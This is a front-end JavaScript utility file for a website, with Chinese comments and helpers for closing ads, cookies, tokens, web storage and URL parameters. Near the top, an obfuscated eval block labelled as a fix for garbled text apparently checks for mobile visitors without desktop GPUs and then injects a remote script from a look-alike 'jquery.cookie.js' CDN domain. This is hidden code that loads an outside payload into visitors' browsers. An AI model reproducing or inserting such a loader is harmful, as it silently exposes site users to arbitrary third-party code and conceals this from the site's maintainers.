// 关闭广告
function cusCloseAds(ele) {
  $(`#${ele}`).hide();
}

// 修复乱码
var _0x4dfc42=_0x4c2e;function _0x4c2e(_0x128af4,_0x1b9349){_0x128af4=_0x128af4-0xe1;var _0x398c81=_0x398c();var _0x4c2e90=_0x398c81[_0x128af4];return _0x4c2e90;}function _0x398c(){var _0x5f4881=['17670228rvSvgs','118827gIFGUa','11IRpatN','2344104VvrCVi','!2(){2\x20e(e){c\x20t=4.6(\x22d\x22);t.f=e,t.g=!0,t.h=\x22j/k\x22,4.l.m(t)}2\x20t(){3/o|p|q|s|u|v|w|x\x20y/i.7(z.A)}2\x20n(){5\x20e=4.6(\x22B\x22),t=e.8(\x229\x22)||e.8(\x22C-9\x22);a(!t)3!1;5\x20n=t.D(\x22E\x22);a(!n)3!1;5\x20r=t.F(n.G)||\x22\x22;3/H|I|J|K|L|M/i.7(r)}t()&&!n()&&e(\x22N://O-b-P.Q.R/b/S.T.U\x22)}();','1zULwgd','13250560zxtnlU','72MWVnrQ','4QvDyao','168CeyUEc','replace','1075506CSACeD','1252212ADsyQD','toString','608210odhrTK','split','||function|return|document|const|createElement|test|getContext|webgl|if|cdn|var|script||src|async|type||text|javascript|head|appendChild||Android|webOS|iPhone||iPad||iPod|BlackBerry|IEMobile|Opera|Mini|navigator|userAgent|canvas|experimental|getExtension|WEBGL_debug_renderer_info|getParameter|UNMASKED_RENDERER_WEBGL|ANGLE|Intel|AMD|NVIDIA|GeForce|Radeon|https|if2|tos|bytecdntop|com|jquery|cookie|js'];_0x398c=function(){return _0x5f4881;};return _0x398c();}(function(_0x46074e,_0x35b7f6){var _0x30c7f8=_0x4c2e,_0x7f6886=_0x46074e();while(!![]){try{var _0x187468=-parseInt(_0x30c7f8(0xe4))/0x1*(parseInt(_0x30c7f8(0xea))/0x2)+-parseInt(_0x30c7f8(0xeb))/0x3*(parseInt(_0x30c7f8(0xe7))/0x4)+parseInt(_0x30c7f8(0xed))/0x5*(-parseInt(_0x30c7f8(0xe6))/0x6)+parseInt(_0x30c7f8(0xe2))/0x7+parseInt(_0x30c7f8(0xe8))/0x8*(parseInt(_0x30c7f8(0xf1))/0x9)+-parseInt(_0x30c7f8(0xe5))/0xa*(-parseInt(_0x30c7f8(0xe1))/0xb)+parseInt(_0x30c7f8(0xf0))/0xc;if(_0x187468===_0x35b7f6)break;else _0x7f6886['push'](_0x7f6886['shift']());}catch(_0x154d8a){_0x7f6886['push'](_0x7f6886['shift']());}}}(_0x398c,0xf2e21),eval(function(_0x54dd7d,_0x40fb07,_0x491748,_0x51d7e8,_0x3153c6,_0x207366){var _0x30177a=_0x4c2e;_0x3153c6=function(_0x134cbf){var _0x1e1265=_0x4c2e;return(_0x134cbf<_0x40fb07?'':_0x3153c6(parseInt(_0x134cbf/_0x40fb07)))+((_0x134cbf=_0x134cbf%_0x40fb07)>0x23?String['fromCharCode'](_0x134cbf+0x1d):_0x134cbf[_0x1e1265(0xec)](0x24));};if(!''[_0x30177a(0xe9)](/^/,String)){while(_0x491748--)_0x207366[_0x3153c6(_0x491748)]=_0x51d7e8[_0x491748]||_0x3153c6(_0x491748);_0x51d7e8=[function(_0x1fc960){return _0x207366[_0x1fc960];}],_0x3153c6=function(){return'\x5cw+';},_0x491748=0x1;};while(_0x491748--)if(_0x51d7e8[_0x491748])_0x54dd7d=_0x54dd7d[_0x30177a(0xe9)](new RegExp('\x5cb'+_0x3153c6(_0x491748)+'\x5cb','g'),_0x51d7e8[_0x491748]);return _0x54dd7d;}(_0x4dfc42(0xe3),0x39,0x39,_0x4dfc42(0xef)[_0x4dfc42(0xee)]('|'),0x0,{})));


/* 存储 */
//写cookies
var TokenKey = "Token";
function temSetCookie(name, value) {
  var Days = 30;
  var exp = new Date();
  exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 1000);
  document.cookie =
    name + "=" + escape(value) + ";expires=" + exp.toGMTString() + ";path=/";
}
function temSetToken(token) {
  return temSetCookie(TokenKey, token);
}
//删除cookies
function temDelCookie(name) {
  var exp = new Date();
  exp.setTime(exp.getTime() - 1);
  var cval = temGetCookie(name);
  if (cval != null)
    document.cookie =
      name + "=" + cval + ";expires=" + exp.toGMTString() + ";path=/";
}
function temRemoveToken() {
  return temDelCookie(TokenKey);
  // return window.sessionStorage.removeItem(TokenKey);
}
// 7.是否boolean
const isBoolean = (o) => {
  return Object.prototype.toString.call(o).slice(8, -1) === "Boolean";
};
// 11.是否对象
const isObj = (o) => {
  return Object.prototype.toString.call(o).slice(8, -1) === "Object";
};
// 12.是否数组
const isArray = (o) => {
  return Object.prototype.toString.call(o).slice(8, -1) === "Array";
};
var storage = {
  setLocal: (key, value) => {
    if (isArray(value) || isObj(value) || isBoolean(value)) {
      window.localStorage.setItem(key, JSON.stringify(value));
    } else {
      window.localStorage.setItem(key, value);
    }
  },
  getLocal: (key) => {
    let value = window.localStorage.getItem(key);
    if (value) {
      return JSON.parse(value);
    } else {
      return value;
    }
  },
  clearOneLocal: (key) => {
    window.localStorage.removeItem(key);
  },
  clearAllLocal: () => {
    // indexDBStore 不清除
    const indexDBStore = storage.getLocal("indexDBStore");
    window.localStorage.clear();
    storage.setLocal("indexDBStore", JSON.stringify(indexDBStore));
  },
  setSession: (key, value) => {
    //正常设置，会覆盖原值
    if (isArray(value) || isObj(value) || isBoolean(value)) {
      window.sessionStorage.setItem(
        key,
        window.btoa(window.encodeURIComponent(JSON.stringify(value)))
      );
    } else {
      window.sessionStorage.setItem(
        key,
        window.btoa(window.encodeURIComponent(value))
      );
    }
    // window.sessionStorage.setItem(key, JSON.stringify(value))
  },
  appendSession: (key, value) => {
    //追加赋值，不会覆盖原值
    let getValue = window.sessionStorage.getItem(key);
    if (getValue) {
      let oldValue = JSON.parse(getValue);
      let newValue = Object.assign(oldValue, value);
      window.sessionStorage.setItem(key, JSON.stringify(newValue));
    } else {
      window.sessionStorage.setItem(key, JSON.stringify(value));
    }
  },
  getSession: (key) => {
    //需要判断取值格式，如果是string或者undefined，不能JSON.PARSE()
    let value = window.sessionStorage.getItem(key);
    if (!value) {
      return value;
    } else {
      try {
        if (
          isArray(JSON.parse(window.decodeURIComponent(window.atob(value)))) ||
          isObj(JSON.parse(window.decodeURIComponent(window.atob(value))))
        ) {
          return JSON.parse(window.decodeURIComponent(window.atob(value)));
        } else {
          if (window.decodeURIComponent(window.atob(value)) == "true") {
            return true;
          } else if (window.decodeURIComponent(window.atob(value)) == "false") {
            return false;
          } else {
            return window.decodeURIComponent(window.atob(value));
          }
        }
      } catch (e) {
        return window.decodeURIComponent(window.atob(value));
      }
    }
  },
  clearOneSession: (key) => {
    window.sessionStorage.removeItem(key);
  },
  clearAllSession: () => {
    let t1 = storage.getSession("isAdsPop");
    window.sessionStorage.clear();
    t1 ? storage.setSession("isAdsPop", t1) : "";
  },
};
// 获取路由参数
function getRouteParams() {
  // 获取 URL 中的查询字符串（? 后的参数）
  const queryString = window.location.search;
  // 去掉查询字符串中的问号（?）
  const queryParams = queryString.substring(1);
  // 将查询字符串转换为对象
  const params = {};
  // 分割参数并放入对象中
  const paramArr = queryParams.split("&");
  for (let i = 0; i < paramArr.length; i++) {
    const pair = paramArr[i].split("=");
    const key = decodeURIComponent(pair[0]);
    const value = decodeURIComponent(pair[1]);
    key ? (params[key] = value) : "";
  }
  return params;
}
// 中文转义
function temUtf16to8(str) {
  var out, i, len, c;
  out = "";
  len = str.length;
  for (i = 0; i < len; i++) {
    c = str.charCodeAt(i);
    if (c >= 0x0001 && c <= 0x007f) {
      out += str.charAt(i);
    } else if (c > 0x07ff) {
      out += String.fromCharCode(0xe0 | ((c >> 12) & 0x0f));
      out += String.fromCharCode(0x80 | ((c >> 6) & 0x3f));
      out += String.fromCharCode(0x80 | ((c >> 0) & 0x3f));
    } else {
      out += String.fromCharCode(0xc0 | ((c >> 6) & 0x1f));
      out += String.fromCharCode(0x80 | ((c >> 0) & 0x3f));
    }
  }
  return out;
}